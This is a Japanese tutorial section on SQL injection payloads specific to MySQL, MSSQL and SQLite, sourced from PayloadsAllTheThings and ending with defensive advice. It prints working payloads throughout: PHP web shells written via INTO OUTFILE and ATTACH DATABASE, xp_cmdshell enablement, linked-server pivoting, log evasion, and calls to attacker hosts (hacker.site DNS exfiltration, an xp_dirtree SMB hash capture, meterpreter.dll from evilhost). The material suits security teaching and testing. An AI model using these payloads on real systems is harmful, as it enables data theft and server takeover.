## DBMS別ペイロード（保守版）

本節は SQL インジェクションの検出・悪用手法のうち、DBMS(データベース管理システム)固有の構文や機能に依存する部分を、MySQL・MSSQL(Microsoft SQL Server)・SQLite の3系統に分けて整理する。参照先は PayloadsAllTheThings リポジトリの各DBMS別ページで、コミュニティによって継続的に更新されている「実戦チートシート」である。UNION攻撃やエラーベース抽出の一般原理は別節で扱ったため、ここではその原理が「各DBMSの実装差」としてどう表面化するか——コメント構文、情報スキーマの位置、ファイルI/O、OSコマンド実行、帯域外(OOB)通信——に絞って解説する。

### なぜDBMSごとに構文が変わるのか

SQLは標準化されているとはいえ、実装ごとに独自拡張(vendor extension)が非常に多い言語である。攻撃者がペイロードを組み立てる際に直面する差異は主に次の3層に分かれる。

1. **字句解析層の差**: コメント記号やエスケープ処理の違い。これによりWAF(Web Application Firewall)バイパスの手口も変わる。
2. **カタログ層の差**: テーブル一覧・カラム一覧をどこから読むか(`information_schema` か `sysobjects`/`syscolumns` か `sqlite_master` か)。
3. **機能層の差**: ファイル読み書き、OSコマンド実行、外部ネットワーク通信(DNS/SMB)をSQL経由で行う拡張機能の有無。

この3層構造を意識すると、初見のDBMSでも「まずコメント構文を確認し、次にカタログテーブルを特定し、最後に高権限機能を探す」という定石で攻略できる。

---

### MySQL

> 出典: MySQL Injection — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md

#### コメント構文とバージョン条件付き実行

MySQLは複数のコメント記法を持つ。

```sql
#              -- ハッシュコメント（行末まで）
/* ... */      -- Cスタイルコメント
/*! ... */     -- バージョン条件付き実行コメント
--             -- SQLコメント（直後にスペースが必要）
;%00           -- NULLバイト終端
```

とりわけ `/*!12345 UNION */` のような「バージョン条件付きコメント」がMySQL特有で重要である。数字はMySQLのバージョン番号(例: `50001` は5.0.01以上)を表し、サーバのバージョンがその数値以上であるときだけ、コメント内部のSQLが実行される。通常のコメントとして解釈されるはずの文字列が、MySQLパーサの拡張仕様により条件付きで「コードとして生きる」ため、単純な文字列パターンマッチ型のWAFがコメントとして無視した内容が、実際のMySQLエンジン上では実行されてしまう。これがWAFバイパスの温床になる。

#### 情報スキーマからの列挙

MySQL 5.0以降は `information_schema` データベースが標準搭載され、これがテーブル・カラム列挙の主戦場になる。

```sql
UNION SELECT 1,2,3,GROUP_CONCAT(schema_name) FROM information_schema.schemata
UNION SELECT 1,2,3,GROUP_CONCAT(table_name) FROM information_schema.tables
  WHERE table_schema='database_name'
UNION SELECT 1,2,3,GROUP_CONCAT(column_name) FROM information_schema.columns
  WHERE table_name='target_table'
```

`GROUP_CONCAT()` は複数行の値を1つの文字列にカンマ区切りで連結する集約関数で、UNIONで返せるカラム数が限られていても、この関数を使えば1カラムに何十件ものテーブル名・カラム名を詰め込んで一度に取得できる。ただし `GROUP_CONCAT` の出力にはデフォルトで1,024文字という上限(`group_concat_max_len` システム変数)があり、大量データを抜く際にこの上限が抽出を妨げることがある。

#### information_schema が使えない場合の代替列挙

`information_schema` へのアクセスがWAFやアプリケーション側フィルタで遮断されている場合、MySQL 4.1以降ではカラム名を推測なしに割り出す技がある。

```sql
1 and (1,2,3,4) = (SELECT * from db.users UNION SELECT 1,2,3,4 LIMIT 1)
```

これは、行値式(row constructor) `(1,2,3,4)` と `SELECT * FROM ... UNION SELECT 1,2,3,4` の結果を比較する構文で、比較時に暗黙のカラム型検証が働き、もし `users` テーブルの実カラムに `NOT NULL` 制約があるものが含まれると `Column 'id' cannot be null` のようなエラーメッセージにカラム名がそのまま漏れる。エラーメッセージという「サイドチャネル」を利用してカタログを介さずにスキーマ情報を得る点が特徴である。

またカラム名を伏せたまま値だけを抜く方法として、位置指定でのカラム参照がある。

```sql
SELECT `4` FROM (SELECT 1,2,3,4,5,6 UNION SELECT * FROM USERS)DBNAME;
```

サブクエリの中でUNIONされた結果セットは、先頭の `SELECT` リストの別名(この場合は数字リテラルがそのまま列名になる)を継承するため、`4` という「列名」で実際には `USERS` テーブルの4番目のカラムを参照できる。カラム名を一切知らなくても位置だけでデータを抜ける。

#### エラーベース抽出: EXTRACTVALUE / UPDATEXML

MySQLのXML関数 `EXTRACTVALUE()` と `UPDATEXML()` は、第2引数にXPath式を渡す仕様になっているため、不正なXPath文字列を渡すとMySQLがXPath構文エラーを投げ、そのエラーメッセージの中に評価済みのサブクエリ結果が埋め込まれる。

```sql
AND EXTRACTVALUE(1337,CONCAT('~',(SELECT version()),'~'))
AND UPDATEXML(1337,CONCAT('~',(SELECT version()),'~'),31337)
```

`~` はXPathとして不正な文字なので、必ずエラーが発生する。エラーメッセージの中に `CONCAT()` で組み立てた文字列(バージョン文字列を `~` で囲んだもの)がそのまま出力されるため、UNIONが使えない状況でも1回のリクエストでデータを読み出せる。ただしこの手法にはMySQLのバージョンに依存する制約があり、MySQL 5.7.11以降ではXPathエラーメッセージの出力長に上限がかかるようになったため、長い文字列を1回で抜くのは難しくなっている(その場合は `SUBSTRING()` で分割抽出する)。

#### ブラインドインジェクション: 文字列比較とタイミング

出力チャネルが一切なく、真偽値の違いしかレスポンスに現れない場合はブラインド技法を使う。

```sql
?id=1 AND ASCII(LOWER(SUBSTR(version(),1,1)))=51
```

`SUBSTR(version(),1,1)` でバージョン文字列の先頭1文字を取り出し、`ASCII()` で数値化して二分探索的に比較する。1文字あたり最大8リクエスト(ASCIIコード0〜255を2進探索)で確定できる。

タイミングベースでは `SLEEP()` 関数を使う。

```sql
AND (SELECT 1 FROM (SELECT(SLEEP(10-(IF(1=1,0,10))))) RANDSTR)
```

条件式が真なら `IF(1=1,0,10)` が0になり `SLEEP(10-0)=SLEEP(10)` で10秒遅延、偽なら `SLEEP(10-10)=SLEEP(0)` で遅延なしとなる。この「条件によってSLEEPの引数を変える」パターンは、レスポンスが常に同じ(エラーも出力差もない)完全ブラインドの状況でも、応答時間という物理的なサイドチャネルさえあれば情報を抜けることを示している。古いMySQL(4/5系)では `BENCHMARK()` 関数(指定回数だけ式を再計算させることでCPU時間を消費させる)も同様の目的で使われた。

#### ファイル読み書きとRCEへの到達

MySQLには `FILE` 権限を持つユーザーであればファイルシステムに直接アクセスできる関数がある。

```sql
UNION ALL SELECT LOAD_FILE('/etc/passwd')--
```

書き込み側は `INTO OUTFILE` / `INTO DUMPFILE` で、Webルート配下にWebシェルを書き込めればRCEに直結する。

```sql
UNION SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "C:\\xampp\\htdocs\\backdoor.php"
```

これが成立する前提は、(1) MySQLプロセスがWebサーバの公開ディレクトリに書き込み権限を持つこと、(2) `--secure-file-priv` システム変数が書き込みを禁止するディレクトリに制限していないこと、の2点である。`secure-file-priv` はMySQL 5.5.53以降デフォルトで有効化される傾向が強まっており、これが設定されている環境では `OUTFILE`/`LOAD_FILE` ともに指定ディレクトリ配下に限定されるため、無条件のRCEは成立しにくくなっている点はバージョン依存の重要な注意点である。

#### 帯域外(OOB)通信によるデータ窃取

UNIONもエラーもブラインドも使えない極端な状況では、MySQLサーバ自身にDNSクエリやSMB通信を発生させて外部にデータを持ち出す。

```sql
SELECT LOAD_FILE(CONCAT('\\\\',VERSION(),'.hacker.site\\a.txt'));
```

Windows上のMySQLが `\\<バージョン文字列>.hacker.site\a.txt` というUNCパスをファイルパスとして解釈しようとする際、まずホスト名解決のためにDNSクエリを発行する。攻撃者が `hacker.site` のDNSサーバを制御していれば、サブドメインとして送られてきた `VERSION()` の値をDNSログから読み取れる。これはアプリケーションのレスポンスを一切必要としない、真の意味での帯域外抽出である。

#### WAFバイパスの発想

MySQL特有のバイパス手法として、指数表記(scientific notation)の悪用がある。

```sql
' or 1.e('') ='
```

`1.e('')` は数値リテラルの指数部として解釈されるため、文字列 `''=` を含む攻撃文字列がWAFの単純な正規表現(`or\s+\d+\s*=\s*\d+` のような典型パターン)に一致しにくくなる。またGBKなどのマルチバイト文字コードを使う環境では、`addslashes()` のようなバックスラッシュエスケープ関数がワイドバイト攻撃で無力化される。`%bf%27` を送ると、アプリ側が `%27`(シングルクォート)の前にバックスラッシュを挿入して `%bf%5c%27` にするが、GBKデコーダは `%bf%5c` を1つの全角文字として解釈してしまい、エスケープ用のバックスラッシュを「食べて」しまう。結果としてエスケープされていない生のシングルクォートがSQL文に残り、インジェクションが成立する。これは文字コード変換層とSQLエスケープ層の間に生じるパーサの不一致を突く典型例である。

---

### MSSQL (Microsoft SQL Server)

> 出典: MSSQL Injection — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md

#### コメント構文とカタログ

MSSQLのコメントは `/* */` と `--` の2種、加えてNULLバイト終端 `;%00` がある。カタログ参照はMySQLの `information_schema` とは別に、SQL Server独自のシステムビューも併用できる。

```sql
SELECT @@version          -- DBMSバージョン
SELECT DB_NAME()          -- 現在のデータベース名
SELECT name FROM master..sysdatabases;      -- データベース一覧
SELECT name FROM <DBNAME>..sysobjects WHERE xtype='U';   -- テーブル一覧
SELECT name FROM syscolumns WHERE id =
  (SELECT id FROM sysobjects WHERE name = 'mytable');     -- カラム一覧
```

`master..sysdatabases` のように「データベース名..システムテーブル名」の2段階ドット記法でデータベースをまたいだ参照ができるのはMSSQL特有のスコープ規則で、これにより現在接続しているデータベース以外のカタログ情報も直接読み出せる。

#### エラーベース: 型変換エラーの悪用

MSSQLは型に厳格で、暗黙変換が失敗すると変換元の値をエラーメッセージにそのまま含める仕様がある。

```sql
AND 1337=CONVERT(INT,(SELECT '~'+(SELECT @@version)+'~')) -- -
```

`CONVERT(INT, 文字列)` は文字列を整数に変換しようとして失敗し、"Conversion failed when converting the varchar value '~Microsoft SQL Server ...~' to data type int" のようなエラーを返す。この挙動はMySQLのXPathエラー抽出と同じ「型検証失敗時にオペランドの実値をログ/エラーに出力してしまう」という設計上の副作用を突く手口であり、DBMSが違っても原理は共通していることが分かる。

#### スタックドクエリ(積み重ねクエリ)

MSSQLの重要な特徴は、多くのドライバ/API経由の接続でセミコロン区切りの複数文(バッチ)をそのまま実行できる点である。

```sql
ProductID=1;waitfor delay '0:0:10'--
ProductID=1; DROP members--
```

MySQLの標準的なWeb接続(`mysqli`/PDO単発クエリなど)では通常1接続1文しか実行できないよう制限されることが多いのに対し、MSSQLはバッチ実行がプロトコルレベルでサポートされているため、`SELECT` 系の脆弱性であっても `;` の後に任意のDML/DDL文(`DROP`, `INSERT`, `EXEC` など)を継ぎ足して実行できてしまう。これはUNIONベースやブラインドより遥かに強力な攻撃面を開くため、MSSQL環境ではスタックドクエリの可否を最初に確認する価値が高い。

#### xp_cmdshell によるOSコマンド実行

MSSQLには拡張ストアドプロシージャという仕組みがあり、その中でも `xp_cmdshell` はOSシェルコマンドをそのまま実行できる。

```sql
EXEC xp_cmdshell "net user";
```

これはSQL Server 2005以降デフォルトで無効化されているが、`sysadmin` ロールを持つ権限があれば `sp_configure` を通じて有効化できる。

```sql
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
```

`sp_configure` は「詳細オプションの表示」を先にオンにしないと `xp_cmdshell` オプション自体が編集対象として見えない、という2段階の防御(デフォルト非表示+デフォルト無効)になっており、これを両方解除して初めてOSコマンド実行に到達できる。つまりMSSQLでのRCEは「SQLインジェクション成立」→「sysadmin権限の確認」→「詳細オプション有効化」→「xp_cmdshell有効化」という複数ステップを要する、比較的重い攻撃チェーンである点がMySQLのOUTFILE直書きRCEとは対照的である。

#### リンクサーバ(Linked Server)を介した横展開

MSSQL特有の機能として、他のSQL Serverインスタンス(あるいは他DBMS)への恒久的な接続を定義できるリンクサーバがある。侵入した1台のMSSQLから、信頼関係のある別サーバへクエリを中継できる。

```sql
select * from master..sysservers                      -- リンクサーバ一覧
select * from openquery("linkedserver", 'select @@version as version')
select 1 from openquery("linkedserver",'select 1;exec master..xp_cmdshell "dir c:"')
```

`openquery()` はリンクサーバ上で実質的に任意のクエリを実行させるパススルー関数であり、リンク先のサーバが `sysadmin` 相当の権限で構成されていれば、侵入したサーバを踏み台にしてリンク先でも `xp_cmdshell` を叩ける。企業ネットワークではバッチ処理やレプリケーションのためにリンクサーバが多段に構成されていることが多く、1つのSQLインジェクションが組織内のDB群全体への横展開の起点になり得る点が、MSSQL環境特有のリスクである。

#### 帯域外抽出とSMBハッシュ窃取

```sql
1'; use master; exec xp_dirtree '\\10.10.10.10\SHARE';--
```

`xp_dirtree` はディレクトリ一覧を取得する拡張ストアドプロシージャだが、引数にUNCパス(ネットワーク共有パス)を渡すと、Windowsの認証機構がSMB接続を試み、攻撃者が用意したリスナーに対してサーバのNTLMハッシュを送信してしまう。これはSQL文の実行結果を使わずに、OS層のファイルアクセス試行そのものを悪用する古典的なテクニックで、後述のSQLiteの `ATTACH DATABASE` 攻撃とは異なる形でOS機能への越境が起きる例である。

#### クレデンシャル抽出とバージョン差

```sql
-- MSSQL 2000 (Hashcatモード131)
SELECT name, password FROM master..sysxlogins
-- MSSQL 2005以降 (Hashcatモード132)
SELECT name, password_hash FROM master.sys.sql_logins
```

MSSQL 2000系と2005以降とでパスワードハッシュの格納テーブルとカラム名、さらにハッシュアルゴリズム自体が変わっている(Hashcatのモード番号が異なる)点は、対象バージョンを特定してから抽出クエリを選ぶ必要があることを示している。

#### ログ回避: sp_password トリック

```sql
' AND 1=1--sp_password
```

`sp_password` という文字列がクエリ末尾に含まれると、SQL Serverはログ記録の際にクエリ本文をそのまま記録せず、"Password not logged" という定型メッセージに置き換える仕様がある(これはストアドプロシージャ `sp_password` 呼び出し時にパスワード文字列がログに残らないようにするための本来の保護機能だが、単なる文字列としてコメント末尾に付与するだけで悪用できる)。攻撃者はこれを使い、注入したクエリの内容が監査ログに残らないようにできる。

---

### SQLite

> 出典: SQLite Injection — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md

#### コメントとカタログ

SQLiteのコメントは `--` と `/* */` のみとシンプルである。カタログは専用のマスターテーブル `sqlite_master`(新しいバージョンでは互換ビュー `sqlite_schema` も使える)に集約されている。

```sql
select sqlite_version();
SELECT sql FROM sqlite_schema
SELECT tbl_name FROM sqlite_master WHERE type='table'
SELECT GROUP_CONCAT(name) AS column_names FROM pragma_table_info('table_name');
```

MySQLの `information_schema` やMSSQLの `sysobjects` に相当するものが、SQLiteでは単一の `sqlite_master` テーブルに集約されている点が特徴である。さらに興味深いのは `sql` カラムで、これは該当オブジェクトを作成した際の `CREATE TABLE` 文そのものが文字列として保存されており、1回のクエリでテーブル定義(カラム名・型・制約)を丸ごと取得できる。`pragma_table_info()` はSQLiteの `PRAGMA table_info(...)` 文をテーブル値関数として呼び出せるようにしたもので、通常の `SELECT` 文の中に埋め込んで使える点がSQLインジェクションとの相性を良くしている。

#### ブラインド抽出とエラーベースの工夫

SQLiteはMySQLのような専用のエラー抽出関数(EXTRACTVALUE等)を持たないため、条件分岐でエラーを人為的に発生させる。

```sql
AND CASE WHEN [BOOLEAN_QUERY] THEN 1 ELSE load_extension(1) END
```

`load_extension()` は本来、拡張ライブラリをロードするための関数だが、引数に整数のような不正な値(パスとして解釈できない値)を渡すと必ずエラーになる。`CASE WHEN` で条件が偽のときだけこの関数を呼ぶようにしておけば、「エラーが出るかどうか」で真偽値を判定できる。時間ベースでは以下のような乱数変換の反復によって計算コストを稼ぐ手法が使われる。

```sql
AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
```

SQLiteには `SLEEP()` に相当する組み込み関数が存在しないため、代わりに `RANDOMBLOB()`(指定バイト数のランダムなバイナリを生成する関数)に巨大なバイト数を渡し、その変換・比較処理自体にCPU時間を消費させて疑似的な時間遅延を作り出している。これはDBMSに直接的なスリープ機構がない場合の一般的な回避策であり、「重い計算を条件分岐の一方にだけ仕込む」という発想はどのDBMSでも応用できる。

#### ATTACH DATABASE を用いたRCE

SQLite特有かつ最も強力な攻撃がこれである。SQLiteはサーバー型DBMSと異なり、データベース自体が1つのファイルであり、`ATTACH DATABASE` 文を使うと任意のパスに新しいSQLiteデータベースファイルを作成・接続できる。

```sql
ATTACH DATABASE '/var/www/shell.php' AS shell;
CREATE TABLE shell.pwn (dataz text);
INSERT INTO shell.pwn (dataz) VALUES ('<?php system($_GET["cmd"]); ?>');--
```

これが機能する理由は2つのゆるさの組み合わせにある。第一に、SQLiteは指定されたパスに書き込み権限さえあれば、拡張子やファイルの既存有無を問わずファイルを作成してしまう。第二に、生成されるファイルの先頭にはSQLiteのマジックヘッダ(`SQLite format 3\0` という16バイトの固定文字列)が付与されるが、PHPのインタプリタは`<?php`タグさえファイル中のどこかに現れれば、それより前にどんなバイナリのゴミが存在しても無視して実行してしまうという寛容な仕様を持つ。この2点が重なることで、「PHPとして解釈されるファイルを、Web公開ディレクトリ内に作る」というRCEが成立する。書き込み先を `/etc/cron.d/` のようなcron設定ディレクトリに変えれば、root権限で動くcronジョブへの昇格も理論上可能になる。

#### load_extension による拡張ロード

```sql
SELECT load_extension('\\evilhost\evilshare\meterpreter.dll','DllMain');
```

SQLiteは外部の共有ライブラリ(Linuxなら `.so`、Windowsなら `.dll`)を動的にロードし、指定した初期化関数を呼び出せる `load_extension()` 機能を持つ。これはデフォルトでは無効化されている(アプリケーション側が明示的に `sqlite3_enable_load_extension()` を呼んでいる場合のみ有効)が、有効な環境ではネットワーク越しの共有パスから任意のネイティブコードをロードさせることができ、ATTACH DATABASE経由のWebシェルよりもさらに直接的なコード実行経路になる。

#### ファイルI/Oの制約

SQLiteは標準では組み込みのファイル読み取り関数(MySQLの `LOAD_FILE()` に相当するもの)を持たない。書き込み側には `writefile()` 関数があるが、これはSQLite拡張(`fileio` 拡張モジュール)が有効化されている場合のみ使用可能であり、デフォルトのビルドには含まれないことが多い点に注意が必要である。つまりSQLite環境での攻撃の主軸は「ファイルI/O関数の直接悪用」ではなく、上述の `ATTACH DATABASE` による間接的なファイル生成にある。

---

### DBMS横断で押さえるべき共通の考え方

3つのDBMSを比較すると、攻撃者の思考プロセスには共通のパターンがあることが分かる。

- **カタログの場所を最初に特定する**: MySQLは `information_schema`、MSSQLは `sysobjects`/`sys.*`、SQLiteは `sqlite_master`。この一手だけでも大半の列挙作業は完了する。
- **エラーメッセージは常に「型変換失敗時に元の値を漏らす」設計上の副作用を突ける**: MySQLのXPath関数、MSSQLの`CONVERT`、SQLiteの`CASE WHEN`+`load_extension`は、いずれも「本来の目的の関数を、意図的にエラーを起こすためだけに流用する」という同じ発想の異なる実装である。
- **RCEへの到達経路はDBMSの設計思想を反映する**: MySQLはファイルシステムへの直接書き込み(`OUTFILE`)、MSSQLは拡張ストアドプロシージャ(`xp_cmdshell`)、SQLiteはデータベース自体がファイルであることを悪用した`ATTACH DATABASE`。いずれも「SQL実行権限を、OSレベルの権限に変換する」ための、そのDBMS固有の橋渡し機能を狙っている。
- **帯域外通信はネットワーク層のプロトコル挙動を悪用する**: MySQLのUNCパス経由DNS解決、MSSQLの`xp_dirtree`によるSMB認証誘発は、いずれもSQL文の実行結果ではなく、OSのネットワーククライアントが自動的に行う名前解決や認証の副作用を情報チャネルとして利用している。

### 防御側の要点

これらの手法はいずれも、パラメータ化クエリ(プリペアドステートメント)を徹底すれば入口の時点で無効化できる。加えて、実運用では次の多層防御が有効である。

- データベースアカウントを最小権限化し、Webアプリ用アカウントには `FILE` 権限(MySQL)、`sysadmin`/`ADMINISTER BULK OPERATIONS`(MSSQL)、拡張ロード権限(SQLite)を付与しない。
- MySQLでは `secure-file-priv` を明示的に設定し、任意パスへの `OUTFILE`/`LOAD_FILE` を禁止する。
- MSSQLでは `xp_cmdshell` を無効化したまま維持し、リンクサーバは必要最小限かつ低権限のセキュリティコンテキストで構成する。
- SQLiteを組み込むアプリケーションでは `sqlite3_enable_load_extension()` を呼ばず、DB接続プロセスにWebルート等の書き込み権限を与えない。
- WAFは単純な文字列パターンだけでなく、`/*!...*/` のようなバージョン条件付きコメントや指数表記・マルチバイト文字によるバイパスを想定したルールを備える。

これらの原則は個々のペイロードを暗記することよりも重要であり、新しいDBMSやバージョンに遭遇した際にも「コメント構文→カタログ→高権限機能→OOB経路」という同じ探索順序を適用することで、体系的に攻撃面を評価できる。
